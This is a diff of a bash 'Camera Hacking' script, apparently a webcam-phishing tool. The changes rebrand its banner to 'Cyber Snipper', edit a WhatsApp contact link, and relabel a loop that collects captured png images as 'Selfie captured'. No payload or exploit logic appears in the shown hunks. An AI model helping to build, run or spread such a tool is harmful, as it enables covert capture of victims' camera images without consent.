@@ -39,7 +39,7 @@ echo -e "\e[95m
 ██████╔╝█████╗  ███████╗██║   ██║██╔██╗ ██║█████╗   ╚███╔╝ 
 ██╔══██╗██╔══╝  ╚════██║██║   ██║██║╚██╗██║██╔══╝   ██╔██╗ 
 ██║  ██║███████╗███████║╚██████╔╝██║ ╚████║███████╗██╔╝ ██╗
-╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
+╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝  cyber snipper team
                                                              \e[95;1m \e[0m\n"
     echo""    
   echo -e $'\e[1;33m\e[0m\e[1;31m    ██████████\e[0m'"\e[1;37m██████████"'\e[1;33m\e[0m\e[0;32m██████████\e[0m' '\e[1;32m\e[0m\e[1;32m Camera Hacking \e[0m''\e[1;37m\e[0m\e[1;37m [v 2.1] \e[0m'                                       
@@ -57,7 +57,7 @@ echo -e "\e[95m
       echo "" 
 sleep 8
 clear
-xdg-open "https://wa.me/+2348158848771/5muVOk"
+xdg-open "https://wa.me/+2348158848771"
 echo ""
 echo ""
 printf "\e[31m[\e[32m★\e[31m]\e[32m This Tool is only educational purpose and we are not responsible for kind of illegal activity done by this tool\e[m "
@@ -89,17 +89,17 @@ cwd=`pwd`
 
 # Logo 
 logo="
-${green}    RESONEX       Rex Hacking
+${green}    RESONEX      CYBER SNIPPER
 ${cyan} 
 ${cyan}     ██████  ███████ ███    ███        
 ${cyan}     ██      ██   ██ ████  ████        
-${cyan}     ██      ███████ ██ ████ ██        
+${green}     ██      ███████ ██ ████ ██        
 ${cyan}     ██      ██   ██ ██  ██  ██        
 ${cyan}     ██████  ██   ██ ██      ██        
 ${cyan}                                   
 ${purple}                                      
 ${purple}          ██   ██  █████   ██████ ██   ██   
-${purple}          ██   ██ ██   ██ ██      ██  ██   
+${green}          ██   ██ ██   ██ ██      ██  ██   
 ${purple}          ███████ ███████ ██      █████    
 ${purple}          ██   ██ ██   ██ ██      ██  ██   
 ${purple}          ██   ██ ██   ██  ██████ ██   ██   
@@ -194,7 +194,7 @@ replacer() {
 stty -echoctl
 
 # Detect UserInterrupt
-trap "echo -e '\n${success}Thanks for Using! Visit Site : https://wa.me/+2348158848771\n'; exit" 2
+trap "echo -e '\n${success}Thanks for Using! Contact us on whatsapp : https://wa.me/+2348158848771\n'; exit" 2
 
 # Termux
 if [[ -d /data/data/com.termux/files/home ]]; then
@@ -628,7 +628,7 @@ while true; do
     fi
     sleep 0.5
     if [[ -e "log.txt" ]]; then
-        echo -e "\007${success}IMAGE FILE RECEIVED ! Download...\n"
+        echo -e "\007${success}Selfie captured ! Download...\n"
         file=`ls | grep png`
         mv -f $file $FOL
         rm -rf log.txt
